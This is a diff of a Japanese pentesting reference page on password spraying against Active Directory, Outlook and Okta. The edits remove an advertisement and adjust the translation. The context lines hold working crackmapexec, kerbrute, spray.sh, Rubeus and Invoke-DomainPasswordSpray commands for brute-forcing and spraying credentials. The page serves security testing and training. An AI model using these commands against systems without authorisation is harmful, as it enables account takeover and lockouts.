@@ -2,24 +2,18 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-<figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>
-
-**モバイルセキュリティ**の専門知識を深めるために、8kSecアカデミーで学びましょう。自己ペースのコースを通じてiOSとAndroidのセキュリティをマスターし、認定を取得しましょう：
-
-{% embed url="https://academy.8ksec.io/" %}
-
 ## **パスワードスプレイング**
 
 いくつかの**有効なユーザー名**を見つけたら、発見した各ユーザーに対して最も**一般的なパスワード**を試すことができます（環境のパスワードポリシーを考慮してください）。\
 **デフォルト**では、**最小****パスワード****長**は**7**です。
 
-一般的なユーザー名のリストも役立つかもしれません：[https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
+一般的なユーザー名のリストも役立つかもしれません: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
 
 いくつかの間違ったパスワードを試すと**アカウントがロックアウトされる可能性があることに注意してください**（デフォルトでは10回以上）。
 
 ### パスワードポリシーを取得する
 
-ユーザーの資格情報やドメインユーザーとしてのシェルがある場合、**次のコマンドでパスワードポリシーを取得できます**：
+ユーザーの資格情報やドメインユーザーとしてのシェルがある場合は、**次のコマンドでパスワードポリシーを取得できます**:
 ```bash
 # From Linux
 crackmapexec <IP> -u 'user' -p 'password' --pass-pol
@@ -52,11 +46,11 @@ crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9c
 # Brute-Force
 ./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
 ```
-- [**spray**](https://github.com/Greenwolf/Spray) _**(ロックアウトを避けるために試行回数を指定できます):**_
+- [**スプレー**](https://github.com/Greenwolf/Spray) _**(ロックアウトを避けるために試行回数を指定できます):**_
 ```bash
 spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
 ```
-- [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute)（python）を使用 - 推奨されません。時々機能しないことがあります。
+- [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute)（python）を使用 - 推奨されません。時々機能しません。
 ```bash
 python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
 python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
@@ -82,7 +76,7 @@ done
 # check passwords for all users in current domain
 .\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
 ```
-- [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) を使用すると（デフォルトでドメインからユーザーを生成し、ドメインからパスワードポリシーを取得し、それに応じて試行回数を制限します）：
+- [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1)（デフォルトでドメインからユーザーを生成し、ドメインからパスワードポリシーを取得し、それに応じて試行回数を制限します）：
 ```powershell
 Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
@@ -123,17 +117,12 @@ Outlookに対するp**assword spraying**のための複数のツールがあり�
 - [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
 - [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)
 
-## References
+## 参考文献
 
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
 - [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
 - [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
 - [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
 
-<figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>
-
-**モバイルセキュリティ**の専門知識を8kSecアカデミーで深めましょう。自己ペースのコースを通じてiOSとAndroidのセキュリティをマスターし、認定を取得しましょう：
-
-{% embed url="https://academy.8ksec.io/" %}
 
 {{#include ../../banners/hacktricks-training.md}}
